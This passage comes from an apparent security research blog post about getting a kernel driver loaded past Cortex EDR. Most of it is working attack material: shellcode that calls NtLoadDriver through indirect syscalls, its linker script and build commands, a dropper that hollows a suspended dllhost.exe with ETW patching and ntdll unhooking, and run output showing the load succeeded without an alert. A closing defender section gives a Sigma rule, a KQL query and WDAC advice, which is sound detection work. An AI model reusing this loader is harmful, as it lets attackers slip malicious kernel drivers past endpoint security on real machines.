        '\\','R','e','g','i','s','t','r','y','\\','M','a','c','h','i','n','e',
        '\\','S','y','s','t','e','m','\\','C','u','r','r','e','n','t','C','o','n',
        't','r','o','l','S','e','t','\\','S','e','r','v','i','c','e','s','\\',
        'M','y','D','r','v', 0
    };
    uint16_t buf[80];
    int i; for (i = 0; reg_path_w[i] && i < 79; ++i) buf[i] = reg_path_w[i]; buf[i] = 0;

    UNICODE_STR us;
    us.Length        = (uint16_t)(i * 2);
    us.MaximumLength = (uint16_t)((i + 1) * 2);
    us.Buffer        = buf;

    /* 8) syscall NtLoadDriver(&us) */
    int64_t status = do_syscall(ssn_load, &us, 0, 0, 0);

    /* 9) marker file with hex NTSTATUS */
    /* ... CreateFileA + WriteFile sequence, see source ... */

die:
    /* 10) clean exit via NtTerminateProcess(-1, 0) */
    void *p_NtTerm = find_export_by_hash(ntdll, fnv1a("NtTerminateProcess"));
    uint32_t ssn_term = read_ssn(p_NtTerm);
    if (ssn_term != 0xFFFFFFFF) {
        do_syscall(ssn_term, (void *)(intptr_t)-1, (void *)0, 0, 0);
    }
    for (;;) __asm__ volatile("hlt");
}
```

### Linker script for the raw-binary output

Standard mingw produces a PE with multiple sections. For raw shellcode we
need everything that's referenced ending up in one consolidated `.text`
so `objcopy -O binary --only-section=.text` captures all of it:

```ld
OUTPUT_FORMAT(pei-x86-64)
ENTRY(sc_entry)
SECTIONS {
    . = 0;
    .text : {
        *(.text*)
        *(.rdata*)
        *(.rodata*)
        *(.data*)
    }
    /DISCARD/ : {
        *(.bss*)
        *(.idata*)
        *(.pdata*)
        *(.xdata*)
        *(.reloc*)
        *(.eh_frame*)
        *(.comment*)
        *(.gnu*)
        *(.note*)
    }
}
```

Build command:

```bash
x86_64-w64-mingw32-gcc -ffreestanding -fPIC -nostdlib -nostartfiles \
  -fno-stack-protector -fno-unwind-tables -fno-asynchronous-unwind-tables \
  -mno-red-zone -Os -Wno-unused-function -fno-jump-tables \
  -Wl,-T,sc.ld,-e,sc_entry \
  shellcode.c -o sc.elf

x86_64-w64-mingw32-objcopy -O binary --only-section=.text sc.elf sc.bin
```

`sc.bin` came out to **2752 bytes**. The `sc_entry` function happened to
land at offset **0x1ac** within the binary (consequence of where the
linker placed it after the helpers); I extract that offset from the
symbol table at embed time so the dropper knows where to point `Rip`.

### The dropper

Embeds `sc.bin` as a byte array via a generated header. The dropper
itself is small — it does only the hollow shape and reads the marker file
afterwards:

```c
#include "shellcode_embedded.h"   /* defines SC_BYTES[], SC_LEN, SC_ENTRY_OFFSET */

int main(void) {
    bp_init(BP_ETW_PATCH | BP_INDIRECT_SYSCALLS | BP_NTDLL_UNHOOK_SELECTIVE);

    /* spawn dllhost SUSPENDED */
    STARTUPINFOA si = { .cb = sizeof si };
    PROCESS_INFORMATION pi = { 0 };
    char cmd[] = "C:\\Windows\\System32\\dllhost.exe";
    CreateProcessA(cmd, cmd, NULL, NULL, FALSE,
                   CREATE_SUSPENDED | CREATE_NO_WINDOW,
                   NULL, NULL, &si, &pi);

    /* RWX alloc in remote */
    LPVOID remote = VirtualAllocEx(pi.hProcess, NULL, SC_LEN,
                                    MEM_COMMIT | MEM_RESERVE,
                                    PAGE_EXECUTE_READWRITE);

    /* write shellcode */
    WriteProcessMemory(pi.hProcess, remote, SC_BYTES, SC_LEN, NULL);

    /* point Rip at sc_entry */
    CONTEXT ctx = { .ContextFlags = CONTEXT_FULL };
    GetThreadContext(pi.hThread, &ctx);
    ctx.Rip = (DWORD64)(ULONG_PTR)remote + SC_ENTRY_OFFSET;
    ctx.Rcx = ctx.Rip;
    SetThreadContext(pi.hThread, &ctx);

    /* go */
    ResumeThread(pi.hThread);
    WaitForSingleObject(pi.hProcess, 10000);

    DWORD ec = 0;
    GetExitCodeProcess(pi.hProcess, &ec);
    printf("dllhost exit code = 0x%08lx\n", ec);

    /* read the marker the shellcode wrote */
    HANDLE h = CreateFileA("C:\\Tools\\load_status.txt",
                           GENERIC_READ, FILE_SHARE_READ|FILE_SHARE_WRITE,
                           NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    /* ... ReadFile + print ... */

    return ec == 0 ? 0 : 100;
}
```

### What happened on the run

```
[loader] bp_init=0
[loader] dllhost PID=30232 SUSPENDED
[loader] remote alloc @ 0x26d5fa40000 (RWX, 2752 bytes)
[loader] shellcode written, entry @ 0x26d5fa401ac
[loader] resumed; waiting up to 10s...

dllhost PID=30232 exit code = 0x00000000 (0)  wait=0

C:\Tools\load_status.txt:
[sc] NtLoadDriver status=0x00000000
```

`NTSTATUS 0x00000000` from `NtLoadDriver`. The driver was now mapped in
the kernel from inside a hollowed `dllhost.exe`. No Cortex alert. A
sanity-check IOCTL against the driver's device (from a separate small
probe binary the operator runs after) returned a canonical kernel
address. End to end.

## Defender takeaway

This is detectable. None of the deployed rules I tripped against are
stupid; they're just not aggressive enough on this exact shape yet.

What would have caught this chain:

1. **An ETW-TI consumer on `ProcessTamperingEvent`**.
   `Microsoft-Windows-Threat-Intelligence` emits an event whenever a
   process replaces its image — that's the textbook process-hollowing
   primitive. Cortex's prevention surface at the time of writing doesn't
   appear to act on this provider in the consumer pipeline for
   `dllhost.exe`; if it did, we wouldn't have got past round 5.

2. **A kernel-callback rule on `NtLoadDriver` from a child of `dllhost`**.
   `dllhost` legitimately doesn't load drivers. A behavioural rule that
   correlates `dllhost.exe` (any PID) with a subsequent `NtLoadDriver`
   call in the same process is the simplest possible signature for this
   chain. It would have caught rounds 5–9. A draft Sigma rule:

   ```yaml
   title: NtLoadDriver invoked from dllhost.exe
   id: hollow-dllhost-ntloaddriver-2026
   status: experimental
   description: |
     The dllhost.exe Microsoft signed binary does not load kernel drivers
     in normal operation. A NtLoadDriver syscall observed from a dllhost
     process is consistent with the process-hollowing + raw shellcode +
     direct syscall variant of BYOVD.
   logsource:
     product: windows
     service: sysmon
   detection:
     image_load:
       EventID: 6   # Driver loaded
     parent:
       ParentImage|endswith: '\dllhost.exe'
     condition: image_load and parent
   level: high
   ```

3. **Static check on `dllhost.exe` instances doing unexpected things**.
   On a normal Windows 11 host, `dllhost.exe` runs as a COM surrogate for
   well-defined CLSIDs. Any `dllhost` instance that is not a child of
   `svchost.exe` (DcomLaunch) and not started with a `/Processid:{...}`
   argument is suspicious by definition. A KQL query for Microsoft
   Defender for Endpoint:

   ```kql
   DeviceProcessEvents
   | where FileName =~ "dllhost.exe"
   | where ProcessCommandLine !contains "/Processid:"
       or InitiatingProcessFileName !=~ "svchost.exe"
   | project Timestamp, DeviceName, ProcessId, ParentProcessName,
             ProcessCommandLine, AccountName
   ```

4. **WDAC deny rule on the specific driver hashes you care about**. This
   one doesn't catch the technique, it catches *this particular
   exploitation path* by blocking the driver load at HVCI time. The
   relevant Authentihash gap is what made the BYOVD half of the chain
   possible at all — closing it is what defenders should be doing in
   their App Control policies right now, even before MS adds it to the
   next block-list quarterly update.

## What's not in this post

The signed driver itself, the new primitives it exposes, the IOCTL
walkthrough, and the operational chain to LSASS dump are tracked
separately through PSIRT (vendor) and MSRC (Microsoft, for HVCI
block-list inclusion). I'll publish that material once the coordinated
disclosure clock has run. This post is intentionally the loader side only
— process hollowing of `dllhost.exe` with indirect syscalls is
interesting independent of what gets loaded, and Cortex's coverage matrix
against this shape is publishable research that doesn't accelerate
exploitation of any one driver.

Sources:

🔗 [shellcode.c — full source](https://github.com/TREXNEGRO/Research/tree/master/dllhost-hollow-shellcode){:target="_blank"}
🔗 [dropper.c — full source](https://github.com/TREXNEGRO/Research/tree/master/dllhost-hollow-shellcode){:target="_blank"}
🔗 [linker script + build flags](https://github.com/TREXNEGRO/Research/tree/master/dllhost-hollow-shellcode){:target="_blank"}

Authorised lab use only.

— SixSixSix
